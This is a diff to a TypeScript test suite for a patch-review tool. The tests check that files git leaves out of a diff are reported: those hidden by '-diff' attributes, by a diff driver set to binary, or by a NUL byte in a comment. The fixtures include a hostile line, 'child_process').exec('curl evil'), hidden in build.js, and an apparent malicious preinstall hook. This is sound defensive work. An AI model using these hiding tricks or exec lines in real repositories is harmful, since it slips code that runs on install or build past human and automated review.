@@ -27,7 +27,7 @@ function git(cwd: string, ...args: string[]): string {
   }).toString();
 }
 
-describe("what the patch shows when the tree decides how git renders it", () => {
+describe("what the patch shows when something decides how git renders it", () => {
   let dir: string;
   let work: string;
   let baseSha: string;
@@ -53,7 +53,7 @@ describe("what the patch shows when the tree decides how git renders it", () => 
    * is what makes it worse than hiding the file — the file list stays honest and only the contents
    * vanish, so nothing downstream has any sign that the patch has a hole in it.
    */
-  it("reports the file whose contents a committed .gitattributes hides", async () => {
+  it("reports the file a committed .gitattributes hides with a bare -diff", async () => {
     writeFileSync(join(work, ".gitattributes"), "package.json -diff\n");
     writeFileSync(join(work, "package.json"), SECRET);
     git(work, "add", "-A");
@@ -86,12 +86,47 @@ describe("what the patch shows when the tree decides how git renders it", () => 
   });
 
   /**
-   * The control, and the reason this is reported rather than refused or re-read with `--text`. A
-   * real binary renders as `Binary files … differ` too — identically, from the patch's side — and
-   * `--text` would have turned a 30 KB image into 30 KB of patch, making any change that adds one
-   * permanently unacceptable. Nothing in the tree said to hide this, so nothing here is hidden.
+   * The second way, and the one an attribute-based check cannot see: the attribute reads as an
+   * ordinary driver name, and only the config says it means "binary". Neither `--no-textconv` nor
+   * `--no-ext-diff` touches `diff.<driver>.binary`.
    */
-  it("says nothing is suppressed for a genuinely binary file", async () => {
+  it("reports the file hidden by a diff driver that declares itself binary", async () => {
+    writeFileSync(join(work, ".gitattributes"), "package.json diff=z\n");
+    git(work, "config", "diff.z.binary", "true");
+    writeFileSync(join(work, "package.json"), SECRET);
+    git(work, "add", "-A");
+    git(work, "commit", "--quiet", "-m", "plant a driver");
+
+    const diff = await collectDiff(createRunner(), work, baseSha);
+
+    expect(diff.patch).not.toContain("preinstall");
+    expect(diff.suppressedDiffs).toEqual(["package.json"]);
+  });
+
+  /**
+   * The third way, with nothing planted anywhere at all: a raw NUL inside a JavaScript block
+   * comment is enough for git to call the file binary, and the file is still valid JavaScript.
+   */
+  it("reports a file git calls binary on its own, with no attribute and no config", async () => {
+    writeFileSync(
+      join(work, "build.js"),
+      Buffer.from('/* \0 */ require("child_process").exec("curl evil");\n', "binary")
+    );
+    git(work, "add", "-A");
+    git(work, "commit", "--quiet", "-m", "plant a NUL");
+
+    const diff = await collectDiff(createRunner(), work, baseSha);
+
+    expect(diff.patch).not.toContain("child_process");
+    expect(diff.suppressedDiffs).toEqual(["build.js"]);
+  });
+
+  /**
+   * A real asset lands in the list too, and that is the point rather than a false positive: from
+   * the reader's side it is the same thing — a file listed as changed with its contents missing.
+   * `--text` was the alternative and it was worse: measured, a 30 KB blob becomes 30 KB of patch.
+   */
+  it("reports a genuinely binary file the same way, without inflating it", async () => {
     writeFileSync(join(work, "logo.png"), Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x00, 0x01, 0x02]));
     git(work, "add", "-A");
     git(work, "commit", "--quiet", "-m", "add an image");
@@ -100,7 +135,7 @@ describe("what the patch shows when the tree decides how git renders it", () => 
 
     expect(diff.changedFiles).toContain("logo.png");
     expect(diff.patch).toContain("Binary files");
-    expect(diff.suppressedDiffs).toEqual([]);
+    expect(diff.suppressedDiffs).toEqual(["logo.png"]);
     // The patch carries the fact of the change, not the bytes of it
     expect(diff.patch.length).toBeLessThan(500);
   });
@@ -141,7 +176,7 @@ describe("what a hidden file does to the offer", () => {
 
   afterEach(() => rmSync(dir, { recursive: true, force: true }));
 
-  it("cannot be accepted, and says which file was hidden", async () => {
+  it("cannot be accepted, and says which file was not shown", async () => {
     writeFileSync(join(work, ".gitattributes"), "package.json -diff\n");
     writeFileSync(join(work, "package.json"), SECRET);
     git(work, "add", "-A");
@@ -154,9 +189,8 @@ describe("what a hidden file does to the offer", () => {
   });
 
   /**
-   * The control, and the false positive this shape exists to avoid: marking generated files
-   * `-diff` is an ordinary convention, and it lands most often on exactly the lockfiles this gate
-   * protects. A change that does not touch one is unaffected by the repository's having said so.
+   * The control: a change git shows in full is acceptable, whatever the repository says about
+   * files it does not touch. Marking generated files `-diff` is an ordinary convention.
    */
   it("leaves a change that touches no hidden file acceptable", async () => {
     writeFileSync(join(work, ".gitattributes"), "package-lock.json -diff\n");
